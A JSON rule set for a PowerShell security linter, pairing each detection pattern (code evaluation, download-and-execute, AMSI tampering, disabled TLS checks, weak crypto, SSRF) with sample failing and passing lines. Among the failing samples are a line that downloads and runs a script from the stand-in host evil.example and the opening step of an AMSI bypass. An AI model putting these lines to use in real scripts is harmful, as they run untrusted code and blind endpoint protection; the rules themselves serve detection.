[
  {
    "id": "powershell-code-eval",
    "group": "security",
    "languages": ["powershell"],
    "severity": "ERROR",
    "category": "security:code-execution",
    "message": "Invoke-Expression executes a string taken from user-controlled data",
    "fix": "Avoid IEX; use script blocks, param validation, or a fixed command",
    "either": ["Invoke-Expression $C", "IEX $C"],
    "mvr": { "C": "[Uu]ser|[Ii]nput|[Qq]uery|[Pp]aram|[Rr]equest" },
    "metadata": { "owasp": "A03:2021-Injection", "cwe": "CWE-95", "confidence": "HIGH" },
    "fail": "Invoke-Expression $userScript",
    "pass": "Invoke-Expression $bannerText"
  },
  {
    "id": "powershell-download-exec",
    "group": "security",
    "languages": ["powershell"],
    "severity": "WARNING",
    "category": "security:supply-chain",
    "message": "Script downloaded over the network (unverified code execution risk)",
    "fix": "Ship scripts locally and verify signatures/hashes before running",
    "pattern": "DownloadString($U",
    "mvr": { "U": "[Hh]ttp|[Uu]ser|[Ii]nput|[Tt]emp" },
    "metadata": { "owasp": "A08:2021-Integrity-Failure", "cwe": "CWE-494", "confidence": "HIGH" },
    "fail": "IEX (New-Object Net.WebClient).DownloadString(\"https://evil.example/a.ps1\")",
    "pass": "Copy-Item \"$src\\tool.ps1\" $dst -Force"
  },
  {
    "id": "powershell-amsi-bypass",
    "group": "security",
    "languages": ["powershell"],
    "severity": "ERROR",
    "category": "security:code-execution",
    "message": "AMSI telemetry tampering (AmsiUtils / amsiInitFailed manipulation)",
    "fix": "Remove the bypass; let endpoint protection inspect script content",
    "either": ["AmsiUtils", "amsiInitFailed"],
    "metadata": { "owasp": "A03:2021-Injection", "cwe": "CWE-94", "confidence": "HIGH" },
    "fail": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed')",
    "pass": "Get-Process | Where-Object { $_.Name -eq 'chrome' }"
  },
  {
    "id": "powershell-insecure-tls",
    "group": "security",
    "languages": ["powershell"],
    "severity": "ERROR",
    "category": "security:misconfig",
    "message": "TLS certificate verification disabled in a PowerShell web call",
    "fix": "Drop the override and trust the server certificate chain",
    "either": ["ServerCertificateValidationCallback = $CB", "-SkipCertificateCheck"],
    "mvr": { "CB": "true" },
    "metadata": { "owasp": "A05:2021-Security-Misconfiguration", "cwe": "CWE-295", "confidence": "HIGH" },
    "fail": "Invoke-WebRequest $uri -SkipCertificateCheck",
    "pass": "Invoke-WebRequest $uri -UseBasicParsing"
  },
  {
    "id": "powershell-plaintext-password",
    "group": "security",
    "languages": ["powershell"],
    "severity": "ERROR",
    "category": "security:secrets",
    "message": "Plaintext password converted to a SecureString (cleartext origin)",
    "fix": "Read credentials from a secret store or prompt instead of literals",
    "pattern": "ConvertTo-SecureString $P -AsPlainText",
    "mvr": { "P": "[Uu]ser|[Pp]assw|\\$plain" },
    "metadata": { "owasp": "A02:2021-Crypto-Failures", "cwe": "CWE-312", "confidence": "HIGH" },
    "fail": "ConvertTo-SecureString $userPass -AsPlainText -Force",
    "pass": "ConvertTo-SecureString $env:BOT_TOKEN -AsPlainText"
  },
  {
    "id": "powershell-weak-cipher",
    "group": "security",
    "languages": ["powershell"],
    "severity": "WARNING",
    "category": "security:weak-crypto",
    "message": "Obsolete cipher (DES/RC2) in use",
    "fix": "Use AES-GCM or AES-256-CBC with authenticated encryption",
    "either": ["DESCryptoServiceProvider", "RC2CryptoServiceProvider"],
    "metadata": { "owasp": "A02:2021-Crypto-Failures", "cwe": "CWE-327", "confidence": "MEDIUM" },
    "fail": "$des = New-Object System.Security.Cryptography.DESCryptoServiceProvider",
    "pass": "$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider"
  },
  {
    "id": "powershell-weak-hash",
    "group": "security",
    "languages": ["powershell"],
    "severity": "WARNING",
    "category": "security:weak-crypto",
    "message": "MD5/SHA-1 chosen as a file hash (broken for security purposes)",
    "fix": "Use SHA256 or stronger for integrity checks",
    "pattern": "-Algorithm $ALG",
    "mvr": { "ALG": "MD5|SHA1" },
    "metadata": { "owasp": "A02:2021-Crypto-Failures", "cwe": "CWE-327", "confidence": "MEDIUM" },
    "fail": "Get-FileHash .\\firmware.bin -Algorithm MD5",
    "pass": "Get-FileHash .\\firmware.bin -Algorithm SHA256"
  },
  {
    "id": "powershell-ssrf-user-input",
    "group": "security",
    "languages": ["powershell"],
    "severity": "ERROR",
    "category": "security:owasp-a10-ssrf",
    "message": "REST call URL taken from user-controlled data (SSRF)",
    "fix": "Validate the URL against an allowlist of hosts/schemes",
    "pattern": "Invoke-RestMethod $URL",
    "mvr": { "URL": "[Uu]ser|[Ii]nput|[Qq]uery|[Pp]aram|[Rr]equest|[Nn]ext" },
    "metadata": { "owasp": "A10:2021-Server-Side-Request-Forgery", "cwe": "CWE-918", "confidence": "HIGH" },
    "fail": "Invoke-RestMethod $userSuppliedEndpoint",
    "pass": "Invoke-RestMethod -Uri $apiBase -Headers $headers"
  }
]
